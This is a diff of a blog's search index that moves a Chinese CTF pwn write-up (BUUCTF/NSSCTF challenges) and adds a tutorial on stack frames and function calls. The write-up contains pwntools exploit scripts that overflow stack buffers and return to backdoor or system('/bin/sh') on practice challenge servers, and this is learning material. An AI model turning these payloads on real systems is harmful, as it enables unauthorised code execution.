@@ -73,86 +73,6 @@
       </tags>
   </entry>
   <entry>
-    <title>BUUCTF wp</title>
-    <url>/2025/01/19/wp/</url>
-    <content><![CDATA[<h1 id="1-NISACTF-2022-ReorPwn"><a href="#1-NISACTF-2022-ReorPwn" class="headerlink" title="1.[NISACTF 2022]ReorPwn?"></a>1.[NISACTF 2022]ReorPwn?</h1><p><img src="/2025/01/19/wp/image-20250119144608720.png" alt="image-20250119144608720"></p>
-<p>用ida打开发现gets危险函数但是没有栈溢出，在调用system函数前，调用了fun函数</p>
-<p>看一下fun函数没看懂搜了一下，是交换字符串的位置反转一下，输入sl没有反应，直接输入galf tac，flag出来了</p>
-<p><img src="/2025/01/19/wp/image-20250119144645315.png" alt="image-20250119144645315"></p>
-<h1 id="2-BJDCTF-2020-babystack2-0"><a href="#2-BJDCTF-2020-babystack2-0" class="headerlink" title="2.[BJDCTF 2020]babystack2.0"></a>2.[BJDCTF 2020]babystack2.0</h1><p>Checksec发现64位nx保护开启</p>
-<p><img src="/2025/01/19/wp/image-20250119140419683.png" alt="image-20250119140419683"></p>
-<p>从题目提示看是整数溢出和栈溢出</p>
-<p>用idea打开发现后门函数backdoor（0x0400726）和危险函数read可以栈溢出（0x10），但是被if函数限制了得绕过if函数</p>
-<p><img src="/2025/01/19/wp/image-20250119140514421.png" alt="image-20250119140514421"></p>
-<p>搜了一下wp</p>
-<p><img src="/2025/01/19/wp/image-20250119140127117.png" alt="image-20250119140127117"></p>
-<p>看懂了，本来nbytes是无符号的整型（size_t），而后面转换成了有符号的整型（int）发送-1，10绕过if，且unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值，使read函数能够栈溢出最后返回到后门的地址。</p>
-<p>exp</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import*<br><span class="hljs-attribute">r</span> = remote(&#x27;node4.anna.nssctf.cn&#x27;,<span class="hljs-number">28220</span>)<br><span class="hljs-attribute">p1</span> = b&#x27;-<span class="hljs-number">1</span>&#x27;<br><span class="hljs-attribute">r</span>.sendline(p1)<br><span class="hljs-attribute">p2</span> = b&#x27;a&#x27;*(<span class="hljs-number">0</span>x10+<span class="hljs-number">0</span>x8)+p64(<span class="hljs-number">0</span>x0400726)<br><span class="hljs-attribute">r</span>.sendline(p2)<br><span class="hljs-attribute">r</span>.interactive()<br></code></pre></td></tr></table></figure>
-
-<h1 id="3-BJDCTF-2020-babystack"><a href="#3-BJDCTF-2020-babystack" class="headerlink" title="3.[BJDCTF 2020]babystack"></a>3.[BJDCTF 2020]babystack</h1><p><img src="/2025/01/19/wp/image-20250119140737788.png" alt="image-20250119140737788"></p>
-<p>这道题与上一道相似，但是少了if，更简单了，buf读入的数据长度由我们输入的nbytes来决定，这里可以栈溢出，先输入一个大于0x10字节，在进行溢出就可以。</p>
-<p>Exp</p>
-<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span>*<br><span class="hljs-variable">r</span> = <span class="hljs-function"><span class="hljs-title">remote</span>(<span class="hljs-string">&#x27; [node4.anna.nssctf.cn’,28343](http://node4.anna.nssctf.cn:28343/)&#x27;</span>)</span><br><span class="hljs-variable">p1</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;100&#x27;</span><br><span class="hljs-variable">r.sendline</span>(<span class="hljs-variable">p1</span>)<br><span class="hljs-variable">p2</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x10</span>+<span class="hljs-number">0</span><span class="hljs-variable">x8</span>)+<span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">x04006E6</span>)</span><br><span class="hljs-variable">r.sendline</span>(<span class="hljs-variable">p2</span>)<br><span class="hljs-variable">r.interactive</span>()<br></code></pre></td></tr></table></figure>
-
-<p>也可以用上面一个exp因为unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值</p>
-<h1 id="4-NISACTF-2022-ezstack"><a href="#4-NISACTF-2022-ezstack" class="headerlink" title="4.[NISACTF 2022]ezstack"></a>4.[NISACTF 2022]ezstack</h1><p>Checksec发现是32位的。NX保护开启</p>
-<p>Ida分析发现main函数，又发现shell函数发现read可以栈溢出，shift+f12发现system与&#x2F;bin&#x2F;sh，找到system的地址，与&#x2F;bin&#x2F;sh的地址编写exp</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>p = remote(<span class="hljs-string">&#x27;node5.anna.nssctf.cn&#x27;</span>, 22397)<br><span class="hljs-attribute">sh_addr</span>=0x804a024<br><span class="hljs-attribute">system_plt</span>=0x8048390<br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*(0x48+0x4)+p32(system_plt)+p32(sh_addr)+p32(sh_addr)                #第一个p32(sh_addr)用于占位<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
-
-<h1 id="5-GFCTF-2021-where-is-shell"><a href="#5-GFCTF-2021-where-is-shell" class="headerlink" title="5.[GFCTF 2021]where_is_shell"></a>5.[GFCTF 2021]where_is_shell</h1><p>Checksec发现保护开启，ida查看发现危险函数read，可以栈溢出，有system函数无&#x2F;bin&#x2F;sh，不会写，看了一下wp，虽然没有&#x2F;bin&#x2F;sh字符串，但是的汇编二进制代码里的24 30可以用来表示$0，而$0指代的就是”&#x2F;bin&#x2F;sh，</p>
-<p>&#x2F;bin&#x2F;sh的地址为<img src="/2025/01/19/wp/wps2.jpg" alt="img"></p>
-<p><img src="/2025/01/19/wp/wps3.jpg" alt="img"> </p>
-<p>pop rdi；ret地址</p>
-<p><img src="/2025/01/19/wp/wps4.jpg" alt="img"> </p>
-<p>还需要栈对齐需要</p>
-<p><img src="/2025/01/19/wp/wps5.jpg" alt="img"> </p>
-<p>Exp模板</p>
-<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span>*<br><span class="hljs-variable">p</span> = <span class="hljs-variable">remote</span>（）<br><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x10</span> + <span class="hljs-number">8</span>) + <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">ret_addr</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdi_addr</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">sh_addr</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">sys_addr</span>)</span><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload</span>)<br><span class="hljs-variable">p.interactive</span>()<br></code></pre></td></tr></table></figure>
-
-<p><img src="/2025/01/19/wp/wps6.jpg" alt="img"> </p>
-<h1 id="6-NSSCTF-2022-Spring-Recruit-R3m4ke"><a href="#6-NSSCTF-2022-Spring-Recruit-R3m4ke" class="headerlink" title="6.[NSSCTF 2022 Spring Recruit]R3m4ke?"></a>6.[NSSCTF 2022 Spring Recruit]R3m4ke?</h1><p>checksec查看<img src="/2025/01/19/wp/wps7.jpg" alt="img"></p>
-<p>Ida打开，发现危险函数gets栈溢出</p>
-<p>有&#x2F;bin&#x2F;sh字符串非常简单的栈溢出</p>
-<p>找到system的地址栈溢出返回到system地址</p>
-<p><img src="/2025/01/19/wp/wps8.jpg" alt="img"> </p>
-<p>Exp</p>
-<p><img src="/2025/01/19/wp/wps9.jpg" alt="img"> </p>
-<h1 id="7-HNCTF-2022-Week1-easyoverflow"><a href="#7-HNCTF-2022-Week1-easyoverflow" class="headerlink" title="7.[HNCTF 2022 Week1]easyoverflow"></a>7.[HNCTF 2022 Week1]easyoverflow</h1><p>Checksec</p>
-<p><img src="/2025/01/19/wp/wps10.jpg" alt="img"> </p>
-<p>Ida打开发现gets危险函数，可以溢出，发现cat flag字符串可以作为返回地址</p>
-<p>地址：<img src="/2025/01/19/wp/wps11.jpg" alt="img"></p>
-<p>Exp</p>
-<p><img src="/2025/01/19/wp/wps12.jpg" alt="img"> </p>
-<h1 id="8-WUSTCTF-2020-getshell"><a href="#8-WUSTCTF-2020-getshell" class="headerlink" title="8.[WUSTCTF 2020]getshell"></a>8.[WUSTCTF 2020]getshell</h1><p>Checksec</p>
-<p><img src="/2025/01/19/wp/wps13.jpg" alt="img"> </p>
-<p>Ida</p>
-<p>发现<img src="/2025/01/19/wp/wps14.jpg" alt="img"></p>
-<p>可以栈溢出，发现&#x2F;bin&#x2F;sh字符串，地址<img src="/2025/01/19/wp/wps15.jpg" alt="img"></p>
-<p>Exp</p>
-<p><img src="/2025/01/19/wp/wps16.jpg" alt="img"> </p>
-<h1 id="9-GDOUCTF-2023-EASY-PWN"><a href="#9-GDOUCTF-2023-EASY-PWN" class="headerlink" title="9.[GDOUCTF 2023]EASY PWN"></a>9.[GDOUCTF 2023]EASY PWN</h1><p>Ida分析发现是随机生成一个数字，猜数字</p>
-<p>发现gets函数，可以栈溢出</p>
-<p>Shift+f12发现后门flag.txt </p>
-<p>找到地址0x0011D5 </p>
-<p>直接溢出</p>
-<p>Exp如下</p>
-<p><img src="/2025/01/19/wp/wps17.jpg" alt="img"> </p>
-<h1 id="10-others-shellcode"><a href="#10-others-shellcode" class="headerlink" title="10.others_shellcode"></a>10.others_shellcode</h1><p> checksec查看</p>
-<p><img src="/2025/01/19/wp/wps18.jpg" alt="img"> </p>
-<p>Ida查看</p>
-<p>没有看懂</p>
-<p>Nc一下</p>
-<p><img src="/2025/01/19/wp/wps19.jpg" alt="img"> </p>
-<p>直接出来了，非常神奇</p>
-<p>搜了一下wp</p>
-<p><img src="/2025/01/19/wp/wps20.jpg" alt="img"> </p>
-]]></content>
-      <tags>
-        <tag>wp</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>二进制基础</title>
     <url>/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h1 id="一、程序的编译与链接"><a href="#一、程序的编译与链接" class="headerlink" title="一、程序的编译与链接"></a>一、程序的编译与链接</h1><p>从C源代码到可执行文件的生成过程 </p>
@@ -429,6 +349,145 @@
       </categories>
       <tags>
         <tag>二进制</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUUCTF wp</title>
+    <url>/2025/01/19/wp/</url>
+    <content><![CDATA[<h1 id="1-NISACTF-2022-ReorPwn"><a href="#1-NISACTF-2022-ReorPwn" class="headerlink" title="1.[NISACTF 2022]ReorPwn?"></a>1.[NISACTF 2022]ReorPwn?</h1><p><img src="/2025/01/19/wp/image-20250119144608720.png" alt="image-20250119144608720"></p>
+<p>用ida打开发现gets危险函数但是没有栈溢出，在调用system函数前，调用了fun函数</p>
+<p>看一下fun函数没看懂搜了一下，是交换字符串的位置反转一下，输入sl没有反应，直接输入galf tac，flag出来了</p>
+<p><img src="/2025/01/19/wp/image-20250119144645315.png" alt="image-20250119144645315"></p>
+<h1 id="2-BJDCTF-2020-babystack2-0"><a href="#2-BJDCTF-2020-babystack2-0" class="headerlink" title="2.[BJDCTF 2020]babystack2.0"></a>2.[BJDCTF 2020]babystack2.0</h1><p>Checksec发现64位nx保护开启</p>
+<p><img src="/2025/01/19/wp/image-20250119140419683.png" alt="image-20250119140419683"></p>
+<p>从题目提示看是整数溢出和栈溢出</p>
+<p>用idea打开发现后门函数backdoor（0x0400726）和危险函数read可以栈溢出（0x10），但是被if函数限制了得绕过if函数</p>
+<p><img src="/2025/01/19/wp/image-20250119140514421.png" alt="image-20250119140514421"></p>
+<p>搜了一下wp</p>
+<p><img src="/2025/01/19/wp/image-20250119140127117.png" alt="image-20250119140127117"></p>
+<p>看懂了，本来nbytes是无符号的整型（size_t），而后面转换成了有符号的整型（int）发送-1，10绕过if，且unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值，使read函数能够栈溢出最后返回到后门的地址。</p>
+<p>exp</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import*<br><span class="hljs-attribute">r</span> = remote(&#x27;node4.anna.nssctf.cn&#x27;,<span class="hljs-number">28220</span>)<br><span class="hljs-attribute">p1</span> = b&#x27;-<span class="hljs-number">1</span>&#x27;<br><span class="hljs-attribute">r</span>.sendline(p1)<br><span class="hljs-attribute">p2</span> = b&#x27;a&#x27;*(<span class="hljs-number">0</span>x10+<span class="hljs-number">0</span>x8)+p64(<span class="hljs-number">0</span>x0400726)<br><span class="hljs-attribute">r</span>.sendline(p2)<br><span class="hljs-attribute">r</span>.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="3-BJDCTF-2020-babystack"><a href="#3-BJDCTF-2020-babystack" class="headerlink" title="3.[BJDCTF 2020]babystack"></a>3.[BJDCTF 2020]babystack</h1><p><img src="/2025/01/19/wp/image-20250119140737788.png" alt="image-20250119140737788"></p>
+<p>这道题与上一道相似，但是少了if，更简单了，buf读入的数据长度由我们输入的nbytes来决定，这里可以栈溢出，先输入一个大于0x10字节，在进行溢出就可以。</p>
+<p>Exp</p>
+<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span>*<br><span class="hljs-variable">r</span> = <span class="hljs-function"><span class="hljs-title">remote</span>(<span class="hljs-string">&#x27; [node4.anna.nssctf.cn’,28343](http://node4.anna.nssctf.cn:28343/)&#x27;</span>)</span><br><span class="hljs-variable">p1</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;100&#x27;</span><br><span class="hljs-variable">r.sendline</span>(<span class="hljs-variable">p1</span>)<br><span class="hljs-variable">p2</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x10</span>+<span class="hljs-number">0</span><span class="hljs-variable">x8</span>)+<span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">x04006E6</span>)</span><br><span class="hljs-variable">r.sendline</span>(<span class="hljs-variable">p2</span>)<br><span class="hljs-variable">r.interactive</span>()<br></code></pre></td></tr></table></figure>
+
+<p>也可以用上面一个exp因为unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值</p>
+<h1 id="4-NISACTF-2022-ezstack"><a href="#4-NISACTF-2022-ezstack" class="headerlink" title="4.[NISACTF 2022]ezstack"></a>4.[NISACTF 2022]ezstack</h1><p>Checksec发现是32位的。NX保护开启</p>
+<p>Ida分析发现main函数，又发现shell函数发现read可以栈溢出，shift+f12发现system与&#x2F;bin&#x2F;sh，找到system的地址，与&#x2F;bin&#x2F;sh的地址编写exp</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>p = remote(<span class="hljs-string">&#x27;node5.anna.nssctf.cn&#x27;</span>, 22397)<br><span class="hljs-attribute">sh_addr</span>=0x804a024<br><span class="hljs-attribute">system_plt</span>=0x8048390<br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*(0x48+0x4)+p32(system_plt)+p32(sh_addr)+p32(sh_addr)                #第一个p32(sh_addr)用于占位<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="5-GFCTF-2021-where-is-shell"><a href="#5-GFCTF-2021-where-is-shell" class="headerlink" title="5.[GFCTF 2021]where_is_shell"></a>5.[GFCTF 2021]where_is_shell</h1><p>Checksec发现保护开启，ida查看发现危险函数read，可以栈溢出，有system函数无&#x2F;bin&#x2F;sh，不会写，看了一下wp，虽然没有&#x2F;bin&#x2F;sh字符串，但是的汇编二进制代码里的24 30可以用来表示$0，而$0指代的就是”&#x2F;bin&#x2F;sh，</p>
+<p>&#x2F;bin&#x2F;sh的地址为<img src="/2025/01/19/wp/wps2.jpg" alt="img"></p>
+<p><img src="/2025/01/19/wp/wps3.jpg" alt="img"> </p>
+<p>pop rdi；ret地址</p>
+<p><img src="/2025/01/19/wp/wps4.jpg" alt="img"> </p>
+<p>还需要栈对齐需要</p>
+<p><img src="/2025/01/19/wp/wps5.jpg" alt="img"> </p>
+<p>Exp模板</p>
+<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span>*<br><span class="hljs-variable">p</span> = <span class="hljs-variable">remote</span>（）<br><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x10</span> + <span class="hljs-number">8</span>) + <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">ret_addr</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdi_addr</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">sh_addr</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">sys_addr</span>)</span><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload</span>)<br><span class="hljs-variable">p.interactive</span>()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/19/wp/wps6.jpg" alt="img"> </p>
+<h1 id="6-NSSCTF-2022-Spring-Recruit-R3m4ke"><a href="#6-NSSCTF-2022-Spring-Recruit-R3m4ke" class="headerlink" title="6.[NSSCTF 2022 Spring Recruit]R3m4ke?"></a>6.[NSSCTF 2022 Spring Recruit]R3m4ke?</h1><p>checksec查看<img src="/2025/01/19/wp/wps7.jpg" alt="img"></p>
+<p>Ida打开，发现危险函数gets栈溢出</p>
+<p>有&#x2F;bin&#x2F;sh字符串非常简单的栈溢出</p>
+<p>找到system的地址栈溢出返回到system地址</p>
+<p><img src="/2025/01/19/wp/wps8.jpg" alt="img"> </p>
+<p>Exp</p>
+<p><img src="/2025/01/19/wp/wps9.jpg" alt="img"> </p>
+<h1 id="7-HNCTF-2022-Week1-easyoverflow"><a href="#7-HNCTF-2022-Week1-easyoverflow" class="headerlink" title="7.[HNCTF 2022 Week1]easyoverflow"></a>7.[HNCTF 2022 Week1]easyoverflow</h1><p>Checksec</p>
+<p><img src="/2025/01/19/wp/wps10.jpg" alt="img"> </p>
+<p>Ida打开发现gets危险函数，可以溢出，发现cat flag字符串可以作为返回地址</p>
+<p>地址：<img src="/2025/01/19/wp/wps11.jpg" alt="img"></p>
+<p>Exp</p>
+<p><img src="/2025/01/19/wp/wps12.jpg" alt="img"> </p>
+<h1 id="8-WUSTCTF-2020-getshell"><a href="#8-WUSTCTF-2020-getshell" class="headerlink" title="8.[WUSTCTF 2020]getshell"></a>8.[WUSTCTF 2020]getshell</h1><p>Checksec</p>
+<p><img src="/2025/01/19/wp/wps13.jpg" alt="img"> </p>
+<p>Ida</p>
+<p>发现<img src="/2025/01/19/wp/wps14.jpg" alt="img"></p>
+<p>可以栈溢出，发现&#x2F;bin&#x2F;sh字符串，地址<img src="/2025/01/19/wp/wps15.jpg" alt="img"></p>
+<p>Exp</p>
+<p><img src="/2025/01/19/wp/wps16.jpg" alt="img"> </p>
+<h1 id="9-GDOUCTF-2023-EASY-PWN"><a href="#9-GDOUCTF-2023-EASY-PWN" class="headerlink" title="9.[GDOUCTF 2023]EASY PWN"></a>9.[GDOUCTF 2023]EASY PWN</h1><p>Ida分析发现是随机生成一个数字，猜数字</p>
+<p>发现gets函数，可以栈溢出</p>
+<p>Shift+f12发现后门flag.txt </p>
+<p>找到地址0x0011D5 </p>
+<p>直接溢出</p>
+<p>Exp如下</p>
+<p><img src="/2025/01/19/wp/wps17.jpg" alt="img"> </p>
+<h1 id="10-others-shellcode"><a href="#10-others-shellcode" class="headerlink" title="10.others_shellcode"></a>10.others_shellcode</h1><p> checksec查看</p>
+<p><img src="/2025/01/19/wp/wps18.jpg" alt="wps18"></p>
+<p>Ida查看</p>
+<p>没有看懂</p>
+<p>Nc一下</p>
+<p><img src="/2025/01/19/wp/wps19.jpg" alt="wps19"></p>
+<p>直接出来了，非常神奇</p>
+<p>搜了一下wp</p>
+<p><img src="/2025/01/19/wp/wps20.jpg" alt="wps20"></p>
+]]></content>
+      <tags>
+        <tag>wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>栈溢出基础</title>
+    <url>/2025/01/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h1 id="一、栈的介绍"><a href="#一、栈的介绍" class="headerlink" title="一、栈的介绍"></a>一、栈的介绍</h1><h2 id="（1）栈的基本概念"><a href="#（1）栈的基本概念" class="headerlink" title="（1）栈的基本概念"></a>（1）栈的基本概念</h2><p><strong>栈（Stack）</strong>：一种后进先出（LIFO）的数据结构，用于存储程序运行时的临时数据</p>
+<p><strong>栈帧（Stack Frame）</strong>：每个函数调用时，栈会分配一个栈帧，用于存储函数的局部变量、参数、返回地址等信息</p>
+<p><strong>栈指针（SP）</strong>：指向当前栈顶的指针，随着压栈（Push）和出栈（Pop）操作动态变化</p>
+<p><strong>基指针（BP）</strong>：指向当前栈帧的底部，用于在栈帧中定位局部变量和参数</p>
+<p><strong>指令指针（IP&#x2F;EIP&#x2F;RIP）</strong>：指向当前执行的指令地址，函数调用时会保存返回地址到栈中</p>
+<h2 id="（2）栈的内存布局"><a href="#（2）栈的内存布局" class="headerlink" title="（2）栈的内存布局"></a>（2）栈的内存布局</h2><p>函数调用栈是程序运行时内存中一段连续的区域，用于保存函数运行时的状态信息。这些状态信息包括：</p>
+<p><strong>函数参数</strong>：调用函数时传递给被调用函数的参数</p>
+<p><strong>局部变量</strong>：被调用函数中定义的变量</p>
+<p><strong>返回地址</strong>：被调用函数执行完毕后，程序需要返回的位置</p>
+<p><strong>保存的寄存器值</strong>：某些情况下，函数会保存一些寄存器的值，以便在函数返回时恢复</p>
+<h2 id="（3）栈的先进后出特性"><a href="#（3）栈的先进后出特性" class="headerlink" title="（3）栈的先进后出特性"></a>（3）栈的先进后出特性</h2><p>函数调用栈被称为“栈”，是因为它遵循后进先出的原则</p>
+<p><strong>压栈（Push）：</strong>当发生函数调用时，调用函数（caller）的状态被保存到栈中，被调用函数（callee）的状态被压入栈顶。</p>
+<p><strong>退栈（Pop）：</strong>当函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。</p>
+<h2 id="（4）栈的生长方向"><a href="#（4）栈的生长方向" class="headerlink" title="（4）栈的生长方向"></a>（4）栈的生长方向</h2><p>在大多数系统中，函数调用栈在内存中是从高地址向低地址生长的</p>
+<p><strong>压栈时：</strong>栈顶指针（SP）向低地址移动，栈顶对应的内存地址变小。</p>
+<p><strong>退栈时：</strong>栈顶指针（SP）向高地址移动，栈顶对应的内存地址变大。</p>
+<h1 id="二、-函数调用过程"><a href="#二、-函数调用过程" class="headerlink" title="二、 函数调用过程"></a>二、 函数调用过程</h1><h2 id="（1）参数传递的步骤"><a href="#（1）参数传递的步骤" class="headerlink" title="（1）参数传递的步骤"></a>（1）参数传递的步骤</h2><p><strong>1.逆序压栈</strong></p>
+<p>调用函数（caller）按照<strong>逆序</strong>将参数依次压入栈中。这意味着最后一个参数先被压入栈，第一个参数最后被压入栈。</p>
+<p>例如，调用函数 <code>callee(1，2，....，n)</code> 时，参数的压栈顺序是 n，n-1，n-2，…..，2，1</p>
+<figure class="highlight abnf"><table><tr><td class="code"><pre><code class="hljs abnf">push <span class="hljs-number">1</span>    <span class="hljs-comment">; 第一个参数，实际是最后一个压入栈</span><br>push <span class="hljs-number">2</span>    <span class="hljs-comment">; 第二个参数</span><br>push <span class="hljs-number">3</span>    <span class="hljs-comment">; 第三个参数，实际是第一个压入栈</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>2.参数保存</strong></p>
+<p>这些参数被压入栈后，会保存在调用函数（caller）的栈帧中。此时，调用函数的栈帧仍然包含这些参数</p>
+<p><strong>3.被调用函数的状态保存</strong></p>
+<p>在参数压栈之后，调用函数会将控制权交给被调用函数（callee）。此时，被调用函数会创建自己的栈帧，并将这些参数视为自己的输入</p>
+<h2 id="（2）栈帧的切换"><a href="#（2）栈帧的切换" class="headerlink" title="（2）栈帧的切换"></a>（2）栈帧的切换</h2><p>当被调用函数（callee）开始执行时，栈帧的切换过程如下：</p>
+<p><strong>1.保存返回地址</strong></p>
+<p>当调用函数使用 <code>call</code> 指令调用被调用函数时，<code>call</code> 指令会自动将调用函数的下一条指令的地址（即返回地址）压入栈中</p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">call</span> callee  <span class="hljs-comment">; 调用 callee 函数</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>2.创建被调用函数的栈帧</strong></p>
+<p>被调用函数（callee）会创建自己的栈帧，包括保存的寄存器值（也就是调用函数的基地址）、局部变量等</p>
+<p>被调用函数会从栈中读取参数，并在自己的栈帧中使用这些参数</p>
+<figure class="highlight x86asm"><table><tr><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">push</span> <span class="hljs-built_in">ebp</span>       <span class="hljs-comment">; 保存调用者的基地址</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">esp</span>   <span class="hljs-comment">; 建立被调用者的基地址</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>3.执行被调用函数</strong></p>
+<p>被调用函数执行其逻辑，操作局部变量和参数</p>
+<p><img src="/2025/01/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20250120172851935.png" alt="image-20250120172851935"></p>
+<p><strong>4.清理栈帧</strong></p>
+<p>被调用函数执行完毕后，清理自己的栈帧，释放局部变量占用的空间</p>
+<p>返回地址从栈中弹出，存储到指令指针（IP&#x2F;EIP&#x2F;RIP）中，程序跳回调用函数的下一条指令</p>
+<figure class="highlight x86asm"><table><tr><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">esp</span>, <span class="hljs-built_in">ebp</span>  <span class="hljs-comment">; 恢复栈指针到调用者调用时的位置，释放局部变量占用的空间</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebp</span>       <span class="hljs-comment">; 恢复调用者的基地址    </span><br><span class="hljs-keyword">ret</span>           <span class="hljs-comment">; 从栈中弹出返回地址并跳转到该地址</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>注：</strong></p>
+<p><strong>x86</strong></p>
+<p><strong>使用栈来传递参数使用 eax 存放返回值</strong></p>
+<p><strong>amd64</strong></p>
+<p><strong>前6个参数依次存放于 rdi、rsi、rdx、rcx、r8、r9 寄存器中第7个以后的参数存放于栈中</strong></p>
+]]></content>
+      <categories>
+        <category>知识点</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
       </tags>
   </entry>
 </search>
